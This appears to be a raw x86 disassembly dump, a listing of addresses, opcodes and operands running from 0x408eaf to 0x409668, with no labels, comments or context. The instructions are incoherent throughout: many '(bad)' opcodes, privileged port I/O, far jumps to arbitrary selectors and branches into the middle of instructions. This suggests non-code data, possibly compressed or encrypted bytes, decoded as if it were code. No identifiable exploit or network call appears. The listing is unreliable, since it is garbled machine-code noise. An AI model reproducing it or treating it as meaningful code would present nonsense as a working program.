  408eaf:	out    dx,eax
  408eb0:	ret    0x22b9
  408eb3:	repz dec ebp
  408eb5:	ds addr16 or eax,0x6e337d97
  408ebc:	sbb    BYTE PTR [ebx],ah
  408ebe:	sbb    DWORD PTR [ebp+0x35],0xffffffa8
  408ec2:	je     0x408eac
  408ec4:	mov    ss,ebp
  408ec6:	push   es
  408ec7:	test   eax,0xf054cc89
  408ecc:	xchg   ebp,eax
  408ecd:	inc    edi
  408ece:	lods   al,BYTE PTR ds:[esi]
  408ecf:	push   0x3
  408ed1:	imul   edi,DWORD PTR [esi+0x10],0xbd0a2103
  408ed8:	pop    ss
  408ed9:	nop
  408eda:	outs   dx,DWORD PTR ds:[esi]
  408edb:	imul   esi,esi,0xa47332ca
  408ee1:	rcr    BYTE PTR [esi-0x1e3f5250],1
  408ee7:	push   cs
  408ee8:	pop    ebx
  408ee9:	test   al,0xed
  408eeb:	mov    bh,ah
  408eed:	cmp    DWORD PTR [edi],esp
  408eef:	or     eax,esp
  408ef1:	jmp    0xc73a82dc
  408ef6:	pop    ebp
  408ef7:	aaa    
  408ef8:	pop    ss
  408ef9:	xchg   ebp,eax
  408efa:	push   0xe2a1aac2
  408eff:	cmp    esp,DWORD PTR [esi]
  408f01:	int    0x27
  408f03:	inc    esi
  408f04:	pushf  
  408f05:	hlt    
  408f06:	div    DWORD PTR [ebx+0x3c]
  408f09:	adc    BYTE PTR [ecx],dl
  408f0b:	out    dx,al
  408f0c:	pop    edx
  408f0d:	cli    
  408f0e:	int    0x50
  408f10:	in     al,dx
  408f11:	push   edi
  408f12:	xchg   ebp,eax
  408f13:	pop    edx
  408f14:	xchg   ebp,eax
  408f15:	test   BYTE PTR [esi],bl
  408f17:	push   DWORD PTR [esp+eax*1-0x3baef71]
  408f1e:	jbe    0x408ef6
  408f20:	push   eax
  408f21:	pop    edx
  408f22:	sbb    al,0x71
  408f24:	cmp    eax,0xf9ed5977
  408f29:	out    0x6c,eax
  408f2b:	add    BYTE PTR [eax],ah
  408f2d:	leave  
  408f2e:	pop    edx
  408f2f:	fwait
  408f30:	rcr    BYTE PTR [esi+0x7],1
  408f33:	scas   al,BYTE PTR es:[edi]
  408f34:	xchg   esp,eax
  408f35:	aas    
  408f36:	call   0x6d37:0x32bddb0f
  408f3d:	in     eax,0xa
  408f3f:	lods   eax,DWORD PTR ds:[esi]
  408f40:	mov    al,0x13
  408f42:	fild   WORD PTR [ebx-0x44]
  408f45:	pop    esp
  408f46:	in     al,0xd8
  408f48:	lds    ecx,FWORD PTR [ebp-0x6f480f3e]
  408f4e:	gs enter 0x905d,0x6f
  408f53:	ja     0x408fb7
  408f55:	leave  
  408f56:	out    0x55,eax
  408f58:	js     0x408f33
  408f5a:	mov    bl,0x3a
  408f5c:	jae    0x408edf
  408f5e:	xor    al,0xd5
  408f60:	xchg   esp,edi
  408f62:	jno    0x408fd5
  408f64:	jp     0x408eeb
  408f66:	push   edx
  408f67:	xor    edx,DWORD PTR [esi-0x6de019cc]
  408f6d:	lods   eax,DWORD PTR ds:[esi]
  408f6e:	aam    0x11
  408f70:	cdq    
  408f71:	xchg   edi,esi
  408f73:	inc    ecx
  408f74:	sub    al,0xbc
  408f76:	stos   DWORD PTR es:[edi],eax
  408f77:	push   0xea1f9bbe
  408f7c:	push   ebp
  408f7d:	and    esi,ebp
  408f7f:	pop    DWORD PTR [ecx+ebp*8]
  408f82:	dec    ecx
  408f83:	cmp    DWORD PTR [edx-0x71],edi
  408f86:	js     0x408f08
  408f88:	into   
  408f89:	add    eax,0xf3c821cb
  408f8e:	sbb    al,0xa6
  408f90:	mov    ch,0x7
  408f92:	cmc    
  408f93:	sar    BYTE PTR [edx+0x1d60dc64],cl
  408f99:	mov    ah,0x49
  408f9b:	or     eax,0xc4d528f4
  408fa0:	inc    ebx
  408fa1:	test   al,0x47
  408fa3:	stos   BYTE PTR es:[edi],al
  408fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fa5:	jle    0x408f47
  408fa7:	dec    edi
  408fa8:	out    0x9c,eax
  408faa:	lahf   
  408fab:	(bad)  
  408fac:	rcl    BYTE PTR [ebx],cl
  408fae:	sub    dl,ah
  408fb0:	call   FWORD PTR [ecx]
  408fb2:	dec    edx
  408fb3:	pushf  
  408fb4:	je     0x408f76
  408fb6:	es xchg ebp,eax
  408fb8:	pop    ebx
  408fb9:	jnp    0x409036
  408fbb:	(bad)  
  408fbc:	neg    BYTE PTR [esi]
  408fbe:	fstp   TBYTE PTR [esi+0x7fd315d6]
  408fc4:	cmp    bl,BYTE PTR [edx]
  408fc6:	mov    al,0x45
  408fc8:	out    dx,al
  408fc9:	test   DWORD PTR [esp],0x6af7b9e8
  408fd0:	sar    DWORD PTR [ebp-0x7e],cl
  408fd3:	outs   dx,DWORD PTR ds:[esi]
  408fd4:	dec    ecx
  408fd5:	adc    ah,BYTE PTR fs:[ecx+0x32a998d7]
  408fdc:	jmp    0x408f82
  408fde:	test   DWORD PTR [eax+0x38],edx
  408fe1:	aad    0x7a
  408fe3:	fisubr DWORD PTR [esi-0x1c]
  408fe6:	sbb    DWORD PTR [ecx],ebp
  408fe8:	inc    edi
  408fe9:	push   0x29ac714d
  408fee:	or     al,0xb6
  408ff0:	cmp    ebx,DWORD PTR [eax-0x75d144b0]
  408ff6:	inc    ebx
  408ff7:	sub    BYTE PTR [eax],ah
  408ff9:	in     al,dx
  408ffa:	xor    esi,0xffffffe0
  408ffd:	sbb    ch,ah
  408fff:	hlt    
  409000:	inc    esp
  409001:	or     ch,cl
  409003:	mov    cl,0x7
  409005:	lahf   
  409006:	xchg   esp,eax
  409007:	jg     0x408fbf
  409009:	outs   dx,DWORD PTR ds:[esi]
  40900a:	push   ss
  40900b:	inc    ecx
  40900c:	hlt    
  40900d:	cld    
  40900e:	cwde   
  40900f:	cmp    DWORD PTR [eax+eiz*8+0x7fb194b],ebp
  409016:	or     ah,BYTE PTR [esi]
  409018:	mov    DWORD PTR [eax-0x320f89cb],esp
  40901e:	loop   0x408fcb
  409020:	bound  ebp,QWORD PTR [edx+0x29]
  409023:	fs cdq 
  409025:	jmp    0x409090
  409027:	adc    al,0x23
  409029:	and    DWORD PTR [edi+edi*4+0x443d31b1],esi
  409030:	out    0x21,eax
  409032:	push   ds
  409033:	int3   
  409034:	xor    DWORD PTR [edx+0x2c],ebx
  409037:	or     DWORD PTR [edi],ebp
  409039:	mov    DWORD PTR [edx-0x794a0254],eax
  40903f:	stos   BYTE PTR es:[edi],al
  409040:	popf   
  409041:	out    0xff,eax
  409043:	mov    esp,0xbd614f6f
  409048:	cs push esp
  40904a:	jns    0x408fd2
  40904c:	adc    al,BYTE PTR [ebx+0x1ab21a7f]
  409052:	xor    edx,DWORD PTR [ebx-0x28]
  409055:	retf   
  409056:	ds mov bl,0x84
  409059:	and    DWORD PTR [esi+0x1196838e],edx
  40905f:	push   ds
  409060:	mov    eax,ds:0x96f741ae
  409065:	mov    ds:0xafe16589,eax
  40906a:	cmp    bh,ah
  40906c:	sbb    eax,0x9df437f9
  409071:	imul   ecx,DWORD PTR [ebx],0xcc70119d
  409077:	rol    DWORD PTR [eax-0x73],0x92
  40907b:	mov    ?,WORD PTR [edi]
  40907d:	loop   0x40903b
  40907f:	in     al,0x59
  409081:	mov    al,0xf9
  409083:	dec    esi
  409084:	jae    0x4090c1
  409086:	ret    
  409087:	xchg   DWORD PTR [esi+eax*4-0x73c4b275],edx
  40908e:	scas   al,BYTE PTR es:[edi]
  40908f:	pop    ebp
  409090:	popa   
  409091:	mov    al,0x5c
  409093:	mov    ah,0xcf
  409095:	aad    0xee
  409097:	push   ebx
  409098:	retf   0xc325
  40909b:	loopne 0x409022
  40909d:	daa    
  40909e:	shl    BYTE PTR ds:0xaacbb7fa,0x51
  4090a5:	dec    esi
  4090a6:	into   
  4090a7:	mul    edx
  4090a9:	adc    BYTE PTR [esi],bh
  4090ab:	pop    ebp
  4090ac:	push   ds
  4090ad:	push   esi
  4090ae:	xlat   BYTE PTR ds:[ebx]
  4090af:	mov    ecx,0x379e51b0
  4090b4:	adc    BYTE PTR [edi+0x29],bl
  4090b7:	(bad)  
  4090b8:	stos   DWORD PTR es:[edi],eax
  4090b9:	pop    esp
  4090ba:	cmp    bl,BYTE PTR [ecx+0x74d16826]
  4090c0:	and    eax,0xb7acfa23
  4090c5:	mov    esi,0xdc5389bb
  4090ca:	aad    0x23
  4090cc:	jb     0x409148
  4090ce:	xor    BYTE PTR [ecx-0x6f],ch
  4090d1:	mov    dh,0x89
  4090d3:	mov    ebx,0xf95ff811
  4090d8:	xchg   ecx,eax
  4090d9:	push   es
  4090da:	stc    
  4090db:	push   0xffffffc1
  4090dd:	jge    0x409080
  4090df:	stc    
  4090e0:	leave  
  4090e1:	aaa    
  4090e2:	sbb    cl,bl
  4090e4:	or     eax,0x9c548c48
  4090e9:	mov    esp,0xcdf70ea
  4090ee:	mov    edi,ebp
  4090f0:	std    
  4090f1:	inc    ecx
  4090f2:	pop    es
  4090f3:	movntps XMMWORD PTR [esi],xmm0
  4090f6:	dec    edx
  4090f7:	fmul   st,st(7)
  4090f9:	mov    ebp,0xe2f86068
  4090fe:	pop    ebx
  4090ff:	repnz aaa 
  409101:	push   ds
  409102:	fwait
  409103:	dec    esi
  409104:	mov    al,ds:0xe5a06e79
  409109:	cmp    ebp,DWORD PTR [ecx]
  40910b:	adc    BYTE PTR [ecx+0x4c],bh
  40910e:	fild   QWORD PTR [ebx-0x43]
  409111:	dec    ebp
  409112:	imul   ecx,DWORD PTR [eax-0xe87f294],0xffffff83
  409119:	es pushf 
  40911b:	jge    0x409187
  40911d:	mov    WORD PTR [esi+0x1d],ds
  409120:	fild   QWORD PTR [esi+0x33517a93]
  409126:	into   
  409127:	dec    edx
  409128:	ds jns 0x409126
  40912b:	rcl    DWORD PTR [ebp+0x39],cl
  40912e:	pop    esp
  40912f:	mov    ss,WORD PTR [ebx-0x3b]
  409132:	xor    BYTE PTR [ebx-0x70504579],bh
  409138:	inc    ebp
  409139:	mov    DWORD PTR [ebx],edx
  40913b:	sbb    DWORD PTR [eax],ebp
  40913d:	push   ebp
  40913e:	adc    al,0xc0
  409140:	xchg   esi,eax
  409141:	push   ecx
  409142:	and    DWORD PTR [eax+0x25],edi
  409145:	loop   0x4090f2
  409147:	minps  xmm1,XMMWORD PTR [esi]
  40914a:	xchg   edx,eax
  40914b:	cmp    ch,bl
  40914d:	xchg   esi,eax
  40914e:	(bad)  
  40914f:	dec    edx
  409150:	inc    ecx
  409151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409152:	or     eax,0x5b49b4c
  409157:	push   cs
  409158:	out    0xc2,al
  40915a:	int3   
  40915b:	loopne 0x409145
  40915d:	mov    ah,0x2b
  40915f:	pop    eax
  409160:	cdq    
  409161:	or     esp,DWORD PTR [ebx]
  409163:	and    BYTE PTR [edi+0x3e],al
  409166:	dec    edi
  409167:	dec    ebx
  409168:	cmc    
  409169:	push   es
  40916a:	cmp    eax,0x8e82d534
  40916f:	mov    ch,BYTE PTR [esp+edi*1+0x7bf6dda1]
  409176:	dec    ebx
  409177:	sahf   
  409178:	js     0x40916a
  40917a:	pop    eax
  40917b:	jbe    0x409163
  40917d:	arpl   WORD PTR [esi+0x35],ax
  409180:	dec    ecx
  409181:	xor    dh,cl
  409183:	jecxz  0x409149
  409185:	adc    BYTE PTR [esi],0xa7
  409188:	mov    ds:0x6a149f07,eax
  40918d:	scas   eax,DWORD PTR es:[edi]
  40918e:	xchg   ecx,eax
  40918f:	pop    es
  409190:	xchg   di,ax
  409192:	add    eax,0xe2bdfabe
  409197:	cs mov edx,0x3a027a30
  40919d:	sub    eax,0x1c3ce062
  4091a2:	jbe    0x409128
  4091a4:	inc    ebx
  4091a5:	enter  0x47f9,0x20
  4091a9:	jmp    0x41e2:0x31f4e21e
  4091b0:	iret   
  4091b1:	mov    al,0x21
  4091b3:	fnstcw WORD PTR [edi-0x786069eb]
  4091b9:	js     0x40918e
  4091bb:	les    edx,FWORD PTR [eax]
  4091bd:	sahf   
  4091be:	shr    BYTE PTR [ebx+0x2c],cl
  4091c1:	adc    al,0x86
  4091c3:	repz inc ebx
  4091c5:	mov    edi,0xbbaa5ec4
  4091ca:	mov    al,ds:0xa0d6133
  4091cf:	dec    edx
  4091d0:	mov    ebp,0x50d07640
  4091d5:	cmp    al,0x83
  4091d7:	(bad)  
  4091d8:	adc    ah,BYTE PTR [eax+0x64]
  4091db:	(bad)  
  4091dc:	cmp    DWORD PTR ds:0x488c651,ebx
  4091e2:	ret    0x119b
  4091e5:	gs fwait
  4091e7:	or     DWORD PTR [edx+0x206ae9c9],esi
  4091ed:	jmp    0xc566:0x2e57c306
  4091f4:	pop    edi
  4091f5:	pop    esi
  4091f6:	fisubr WORD PTR [edx+0x6b]
  4091f9:	(bad)  
  4091fb:	pop    ebx
  4091fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091fd:	clc    
  4091fe:	call   0xc386:0xe454a4bf
  409205:	dec    esp
  409206:	push   esp
  409207:	(bad)  
  409209:	add    bl,BYTE PTR [ebp-0x11d6ebe3]
  40920f:	sti    
  409210:	test   al,0x33
  409212:	mov    ecx,0x7dcd5697
  409217:	arpl   WORD PTR [edx+eiz*8-0x22],bx
  40921b:	push   esp
  40921c:	xor    al,0x95
  40921e:	out    dx,eax
  40921f:	adc    dl,BYTE PTR [edx+0x24]
  409222:	xchg   edx,eax
  409223:	mov    ecx,0x9b077600
  409228:	arpl   bp,bx
  40922a:	lock cmp ah,dh
  40922d:	cmp    eax,0x46f9af51
  409232:	(bad)  
  409233:	sub    al,0x0
  409235:	mov    ds:0x412b2359,eax
  40923a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40923b:	lds    ecx,FWORD PTR [edx]
  40923d:	cmp    ecx,DWORD PTR [ecx+0x6]
  409240:	xchg   ebp,eax
  409241:	xchg   edx,eax
  409242:	add    al,0xb1
  409244:	xor    BYTE PTR [eax+0x68215a0a],bl
  40924a:	pop    ebx
  40924b:	das    
  40924c:	xor    dh,al
  40924e:	mov    bl,0xbc
  409250:	ss adc eax,0x822ef6c7
  409256:	push   esp
  409257:	push   ebx
  409258:	popf   
  409259:	sbb    al,0xca
  40925b:	pop    esp
  40925c:	adc    DWORD PTR [edi+ecx*2+0x7e],ecx
  409260:	mov    ch,0x9f
  409262:	mov    dl,0xe9
  409264:	pushf  
  409265:	popa   
  409266:	call   0xe4c2e918
  40926b:	fiadd  WORD PTR [ebx+0x7f7d35b6]
  409271:	push   esi
  409272:	shr    DWORD PTR ds:0xa1bc1ffb,1
  409278:	sub    BYTE PTR [ebx-0x56],ah
  40927b:	mov    esp,0x559d8e52
  409280:	xchg   ecx,eax
  409281:	test   eax,0xc3258891
  409286:	jo     0x409259
  409288:	dec    ecx
  409289:	pop    esp
  40928a:	outs   dx,BYTE PTR ds:[esi]
  40928b:	cmp    ch,bl
  40928d:	mov    al,0xc8
  40928f:	lock scas eax,DWORD PTR es:[edi]
  409291:	and    eax,0xe81394f8
  409296:	push   ecx
  409297:	xlat   BYTE PTR ds:[ebx]
  409298:	cmp    ecx,ecx
  40929a:	add    al,0xb2
  40929c:	and    edx,esp
  40929e:	sahf   
  40929f:	ret    
  4092a0:	adc    eax,DWORD PTR [eax+0x3e]
  4092a3:	loopne 0x4092cf
  4092a5:	mov    al,0x74
  4092a7:	(bad)  
  4092a9:	ins    BYTE PTR es:[edi],dx
  4092aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092ab:	rol    ch,cl
  4092ad:	and    BYTE PTR [ebp-0x2bc7c161],al
  4092b3:	push   eax
  4092b4:	js     0x409301
  4092b6:	mov    esp,0x64a3fb53
  4092bb:	les    edx,FWORD PTR [edi+0x5adc5a69]
  4092c1:	outs   dx,DWORD PTR ds:[esi]
  4092c2:	pop    ecx
  4092c3:	das    
  4092c4:	dec    esi
  4092c5:	setp   BYTE PTR [esi]
  4092c8:	sub    BYTE PTR [ebx+0x40502bc1],al
  4092ce:	mov    ah,0x6f
  4092d0:	je     0x4092cf
  4092d2:	adc    al,0xe2
  4092d4:	sub    DWORD PTR [ebp+0x75],ebx
  4092d7:	test   DWORD PTR [eax+0x6c11da12],ecx
  4092dd:	or     BYTE PTR [eax],dh
  4092df:	push   ds
  4092e0:	mov    eax,ds:0x1bebd199
  4092e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092e6:	mov    edx,0xb134948a
  4092eb:	sar    DWORD PTR [ecx+0x2a],0x9a
  4092ef:	jg     0x409276
  4092f1:	cld    
  4092f2:	gs iret 
  4092f4:	(bad)  
  4092f5:	scas   eax,DWORD PTR es:[edi]
  4092f6:	and    al,0xa7
  4092f8:	jp     0x4092a9
  4092fa:	sub    eax,0xffbfc348
  4092ff:	retf   0x7687
  409302:	stos   BYTE PTR es:[edi],al
  409303:	je     0x409289
  409305:	lock outs dx,BYTE PTR ds:[esi]
  409307:	fdivr  DWORD PTR [ebp+0x33]
  40930a:	xor    al,0x70
  40930c:	pop    ebp
  40930d:	icebp  
  40930e:	jge    0x4092fd
  409310:	jb     0x409358
  409312:	(bad)  
  409314:	lods   al,BYTE PTR ds:[esi]
  409315:	jmp    DWORD PTR [ebx-0x1aef4890]
  40931b:	pop    edi
  40931c:	and    edx,DWORD PTR [ebp+0x67]
  40931f:	sbb    ebp,ebp
  409321:	jp     0x4092c1
  409323:	push   ebp
  409324:	aad    0xe2
  409326:	es xchg esp,eax
  409328:	mov    bh,0xc9
  40932a:	fistp  DWORD PTR [edi+eax*8]
  40932d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40932e:	mov    esp,0xb63c3d
  409333:	(bad)  
  409334:	sbb    al,0x7
  409336:	xchg   ebp,eax
  409337:	lahf   
  409338:	or     al,0xeb
  40933a:	sub    BYTE PTR ss:[ecx+0x6501d932],dh
  409341:	cld    
  409342:	xor    eax,0x2432f00d
  409347:	sub    al,BYTE PTR [esi+0x29d602f8]
  40934d:	cwde   
  40934e:	js     0x40936d
  409350:	dec    esi
  409351:	out    0x57,eax
  409353:	mov    edi,DWORD PTR [ebx+0x1e]
  409356:	jmp    0xc0ebd990
  40935b:	test   ah,bh
  40935d:	push   ebx
  40935e:	jmp    0x409323
  409360:	and    ah,BYTE PTR [edx+esi*4+0x43]
  409364:	arpl   WORD PTR [esi+0x47],ax
  409367:	in     eax,0x1e
  409369:	mov    ebp,0x4f4197c1
  40936e:	dec    ecx
  40936f:	inc    ebp
  409370:	fs push es
  409372:	inc    esi
  409373:	add    eax,0xe39a6056
  409378:	call   0xfae2:0xed199327
  40937f:	fild   QWORD PTR [ecx+0x211401e]
  409385:	ret    0x20f2
  409388:	leave  
  409389:	pop    ds
  40938a:	cmp    DWORD PTR gs:[ecx-0x5760c574],esi
  409391:	fbstp  TBYTE PTR [ebp-0x64b9d358]
  409397:	popw   ds
  409399:	test   eax,0x93cd195f
  40939e:	lea    ecx,[ecx+0x8879bee]
  4093a4:	inc    edi
  4093a5:	(bad)  
  4093a7:	cdq    
  4093a8:	push   ebx
  4093a9:	pop    ebp
  4093aa:	rcr    DWORD PTR [eax-0x1ea1df90],0x9a
  4093b1:	in     eax,dx
  4093b2:	bound  eax,QWORD PTR [eax-0x51]
  4093b5:	or     eax,0xa1a90d99
  4093ba:	in     al,dx
  4093bb:	inc    ebp
  4093bc:	dec    ecx
  4093bd:	pop    esi
  4093be:	jmp    0xfced0708
  4093c3:	fnstcw WORD PTR [ebp+0x3010ef3c]
  4093c9:	sub    al,0xad
  4093cb:	into   
  4093cc:	ins    BYTE PTR es:[edi],dx
  4093cd:	push   edi
  4093ce:	adc    edi,edx
  4093d0:	data16 (bad) 
  4093d2:	rcr    DWORD PTR [edx],cl
  4093d4:	push   0xffffffaf
  4093d6:	push   esi
  4093d7:	xchg   esp,eax
  4093d8:	inc    esp
  4093d9:	adc    bl,bl
  4093db:	sti    
  4093dc:	mov    eax,DWORD PTR [edi-0x74]
  4093df:	and    eax,0xca4aeea0
  4093e4:	mov    al,0x80
  4093e6:	push   ecx
  4093e7:	jmp    DWORD PTR [edx+0x63]
  4093ea:	outs   dx,BYTE PTR ds:[esi]
  4093eb:	xor    esi,DWORD PTR [ebx+0x3f]
  4093ee:	ficomp DWORD PTR [esi-0x5c225d36]
  4093f4:	mov    eax,DWORD PTR [eax-0x14]
  4093f7:	mov    esi,eax
  4093f9:	imul   esi,esi,0xffffffe2
  4093fc:	xor    al,ah
  4093fe:	sub    al,0x67
  409400:	lea    ecx,[edi]
  409402:	arpl   WORD PTR [ebx+eiz*1-0x3],cx
  409406:	sbb    bl,bh
  409408:	xor    BYTE PTR [ecx+esi*8-0x162b14b4],dh
  40940f:	mov    al,ds:0x552b8345
  409414:	in     eax,0xb3
  409416:	jns    0x40945d
  409418:	add    BYTE PTR [esi],ch
  40941a:	aam    0x74
  40941c:	out    0x1f,eax
  40941e:	xor    dh,cl
  409420:	hlt    
  409421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409422:	jl     0x40948f
  409424:	xchg   ebp,eax
  409426:	imul   ebp,DWORD PTR [edi+esi*1+0x30],0xffffffaa
  40942b:	jge    0x4093b1
  40942d:	shl    BYTE PTR [edi],0x49
  409430:	xchg   ecx,eax
  409431:	xor    al,0x3c
  409433:	lods   eax,DWORD PTR cs:[esi]
  409435:	je     0x409404
  409437:	adc    eax,0xd73f60e3
  40943c:	je     0x40948e
  40943e:	cld    
  40943f:	cli    
  409440:	lods   eax,DWORD PTR ds:[esi]
  409441:	push   esp
  409442:	pop    ss
  409443:	sub    BYTE PTR ds:0x28adb9db,0xdb
  40944a:	sbb    dh,0x94
  40944d:	sahf   
  40944e:	div    BYTE PTR [eax-0x9]
  409451:	fcom   QWORD PTR [edi+edx*4]
  409454:	ds mov eax,0x77ea5bde
  40945a:	data16 xor BYTE PTR [ecx-0x70299503],al
  409461:	ja     0x4094b7
  409463:	cmp    eax,DWORD PTR [ebp+0x1b]
  409466:	pop    ebx
  409467:	outs   dx,DWORD PTR ds:[esi]
  409468:	xor    dh,BYTE PTR [ebx+0x59408ace]
  40946e:	repz dec ebp
  409470:	ror    bl,1
  409472:	in     eax,0x6c
  409474:	xchg   edi,eax
  409475:	outs   dx,DWORD PTR ds:[esi]
  409476:	or     al,0xa0
  409478:	dec    edx
  409479:	xor    al,0xee
  40947b:	jge    0x40943e
  40947d:	push   edx
  40947e:	or     eax,0xfe1e3758
  409483:	(bad)  
  409484:	int    0xe5
  409486:	or     ebp,esp
  409488:	push   eax
  409489:	ins    DWORD PTR es:[edi],dx
  40948a:	lods   al,BYTE PTR ds:[esi]
  40948b:	and    dl,BYTE PTR [eax-0x54]
  40948e:	out    0x76,eax
  409490:	sbb    esp,DWORD PTR [eax+ebp*1+0x26]
  409494:	sbb    DWORD PTR [edx+0x5a5da6a],ebp
  40949a:	lods   al,BYTE PTR ds:[esi]
  40949b:	aam    0x9e
  40949d:	jo     0x4094e4
  40949f:	enter  0x97b3,0xcc
  4094a3:	cwde   
  4094a4:	in     eax,dx
  4094a5:	lea    edx,[edi-0x62]
  4094a8:	arpl   bp,si
  4094aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094ab:	adc    edx,ecx
  4094ad:	js     0x4094f0
  4094af:	pushf  
  4094b0:	popa   
  4094b1:	(bad)  
  4094b2:	repz inc edi
  4094b4:	jp     0x409476
  4094b6:	fs (bad) 
  4094b8:	in     al,0x4d
  4094ba:	test   BYTE PTR [ebp+esi*2-0x4b21486d],ch
  4094c1:	(bad)  
  4094c2:	call   0x744d:0x75214092
  4094c9:	cmp    ebp,edi
  4094cb:	ds mov edx,0x7cda852
  4094d1:	and    eax,0xd966154a
  4094d6:	call   0x201e:0x6790a6fa
  4094dd:	(bad)  
  4094de:	adc    eax,0xf211604b
  4094e3:	or     ebp,DWORD PTR [ebx]
  4094e5:	adc    esi,0x1e54b55d
  4094eb:	cmc    
  4094ec:	xchg   esp,eax
  4094ed:	stos   BYTE PTR es:[edi],al
  4094ee:	xchg   BYTE PTR [ebx+0x78c10b1a],ch
  4094f4:	fldcw  WORD PTR [eax]
  4094f6:	xchg   BYTE PTR [ebp+0x35fa8922],bh
  4094fc:	jl     0x40955c
  4094fe:	fs ins DWORD PTR es:[edi],dx
  409500:	add    DWORD PTR [eax-0x44fd95d0],esi
  409506:	fdiv   QWORD PTR ds:0x83e00f7b
  40950c:	jmp    0x315125f9
  409511:	mov    ebx,0x84e8dea7
  409516:	and    al,0x4b
  409518:	jb     0x40950a
  40951a:	pop    edi
  40951b:	out    0xd1,al
  40951d:	ret    0x7417
  409520:	ja     0x4094b6
  409522:	mov    bh,0xf6
  409524:	push   esp
  409525:	sub    esi,DWORD PTR [edx]
  409527:	pop    esi
  409528:	fcomp  DWORD PTR [edi+0x61]
  40952b:	jg     0x409516
  40952d:	in     al,dx
  40952e:	lock or eax,0x437c9e7
  409534:	dec    ebx
  409535:	mov    ebp,0x8adbd165
  40953a:	bound  ebx,QWORD PTR [eax]
  40953c:	retf   
  40953d:	jmp    0x9ff0:0xaa9ac595
  409544:	add    al,BYTE PTR [ebx]
  409546:	xor    al,0x9e
  409548:	xchg   esi,eax
  409549:	out    dx,eax
  40954a:	mov    ah,0x95
  40954c:	push   esp
  40954d:	mov    bh,0x9a
  40954f:	data16 je 0x409502
  409552:	sbb    ch,BYTE PTR [ecx]
  409554:	mov    cl,al
  409556:	mov    ds:0x2312ab3c,al
  40955b:	mov    edx,0xe0834f33
  409560:	mov    bh,0xb5
  409562:	and    BYTE PTR [edx],0x16
  409565:	pop    ds
  409566:	hlt    
  409567:	sbb    al,0x50
  409569:	cmp    BYTE PTR [eax-0x71],bh
  40956c:	xchg   edi,eax
  40956d:	jno    0x4095b8
  40956f:	xor    BYTE PTR [eax+0x3],bl
  409572:	out    dx,eax
  409573:	test   DWORD PTR [ecx],esp
  409575:	cwde   
  409576:	pushf  
  409577:	cmp    eax,DWORD PTR [ebx-0x31]
  40957a:	xor    eax,0xa32fe6e2
  40957f:	dec    eax
  409580:	push   esp
  409581:	daa    
  409582:	outs   dx,BYTE PTR ds:[esi]
  409583:	adc    eax,0x3690350a
  409588:	ror    BYTE PTR [ebp+0x584dcd66],cl
  40958e:	out    0x3e,al
  409590:	pop    esi
  409591:	(bad)
  409594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409595:	sub    eax,0x556643fc
  40959a:	adc    eax,0xe81b2158
  40959f:	sahf   
  4095a0:	leave  
  4095a1:	(bad)  
  4095a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095a3:	das    
  4095a4:	jo     0x409612
  4095a6:	std    
  4095a7:	pushf  
  4095a8:	cmp    ah,ah
  4095aa:	or     ch,cl
  4095ac:	xchg   ecx,eax
  4095ad:	in     al,dx
  4095ae:	lods   al,BYTE PTR ds:[esi]
  4095af:	mov    dl,0xd7
  4095b1:	xchg   ecx,eax
  4095b2:	out    dx,eax
  4095b3:	shl    BYTE PTR [ebp+0x5a],0x11
  4095b7:	mov    DWORD PTR [esp+ecx*1-0x5a],esi
  4095bb:	fs pop edi
  4095bd:	loope  0x4095ad
  4095bf:	rol    DWORD PTR [edi-0x26040ee5],1
  4095c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095c6:	(bad)  
  4095c7:	aam    0xf6
  4095c9:	mov    ebx,0xb15e7c47
  4095ce:	ficom  WORD PTR [edx+0x32]
  4095d1:	(bad)  
  4095d2:	fwait
  4095d3:	cmp    BYTE PTR ss:[edi+0x2b],cl
  4095d7:	fsub   QWORD PTR [ebx]
  4095d9:	mov    cl,0x19
  4095db:	imul   esi,DWORD PTR [ebp-0x6],0x6a
  4095df:	mov    ah,0x90
  4095e1:	cwde   
  4095e2:	and    BYTE PTR [ebp-0x31],dh
  4095e5:	call   0xc0729eca
  4095ea:	sub    al,BYTE PTR [ebp-0x631dc7bb]
  4095f0:	(bad)  
  4095f1:	(bad)  
  4095f3:	jne    0x4095aa
  4095f5:	cld    
  4095f6:	fisttp WORD PTR [ecx+0x23]
  4095f9:	pop    edx
  4095fa:	jbe    0x40966f
  4095fc:	mov    DWORD PTR [ebx+0x3a],edi
  4095ff:	adc    al,0x1b
  409601:	stc    
  409602:	mov    esi,0x130f0035
  409607:	cli    
  409608:	jecxz  0x409592
  40960a:	loopne 0x40966a
  40960c:	daa    
  40960d:	cmp    BYTE PTR [edx-0x1d],dh
  409610:	and    dl,BYTE PTR ss:[esi]
  409613:	adc    cl,BYTE PTR [ecx+eax*2+0x38e4b0d7]
  40961a:	and    bh,0xf8
  40961d:	push   ecx
  40961e:	or     ebp,DWORD PTR [ecx+edx*8]
  409621:	fisub  WORD PTR [ecx-0x71]
  409624:	cmp    eax,0x8c27d0b3
  409629:	adc    DWORD PTR [eax],0xffffffda
  40962c:	jb     0x4095d9
  40962e:	push   0xffffffef
  409630:	xor    BYTE PTR [ebp-0x39945ac6],0xd4
  409637:	mov    bh,BYTE PTR [esi+0x59]
  40963a:	stc    
  40963b:	cmc    
  40963c:	imul   eax
  40963e:	in     eax,0x7a
  409640:	adc    dl,bl
  409642:	popf   
  409643:	iret   
  409644:	push   cs
  409645:	repz or al,0x37
  409648:	iret   
  409649:	call   0x358d4e09
  40964e:	mov    edi,0x6597f4c4
  409653:	sar    ecx,1
  409655:	cmp    al,0x7f
  409657:	inc    ebp
  409658:	cmp    eax,0x28b3b8f2
  40965d:	(bad)  
  40965e:	outs   dx,BYTE PTR ds:[esi]
  40965f:	lock inc edi
  409661:	xchg   ch,cl
  409663:	mov    ecx,0xaaa131d
  409668:	ja     0x409644
